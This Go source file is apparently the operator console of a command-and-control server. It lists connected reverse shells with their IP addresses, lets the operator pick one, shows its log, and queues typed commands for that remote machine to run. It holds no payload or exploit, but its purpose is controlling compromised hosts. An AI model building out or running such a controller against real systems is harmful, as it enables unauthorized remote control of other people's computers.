package internal

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

var CurrentShell *Shell

func StartCLI() {
	reader := bufio.NewReader(os.Stdin)

	for {
		if CurrentShell != nil {
			fmt.Printf("xShell %s> ", CurrentShell.Id)
		} else {
			fmt.Print("C2> ")
		}

		command, _ := reader.ReadString('\n')
		command = strings.TrimSuffix(command, "\n")

		if command == "shells" {
			shells, err := ShellMap.GetAll()
			if err != nil {
				fmt.Println("No Active Shells")
				continue
			}
			for _, shell := range shells {
				fmt.Printf("ID: %s, IP: %s\n", shell.Id, shell.Ip)
			}
		} else if strings.HasPrefix(command, "shell ") {
			id := strings.TrimPrefix(command, "shell ")
			if shell, err := ShellMap.Get(id); shell != nil && err == nil {
				CurrentShell = shell
				filePath := fmt.Sprintf("c2/data/%s.log", id)
				data, err := os.ReadFile(filePath)
				if err != nil {
					fmt.Printf("%s\n", err)
				} else {
					fmt.Printf("%s\n", string(data))
				}
			} else if err == nil {
				fmt.Printf("No shell with ID %s\n", id)
			} else {
				fmt.Printf("Error interacting with shell %s\n", err.Error())
			}
		} else if command == "exit" {
			CurrentShell = nil
		} else if CurrentShell != nil {
			CurrentShell.Cmds = append(CurrentShell.Cmds, command)
		} else {
			fmt.Println("Unknown command")
		}
	}
}
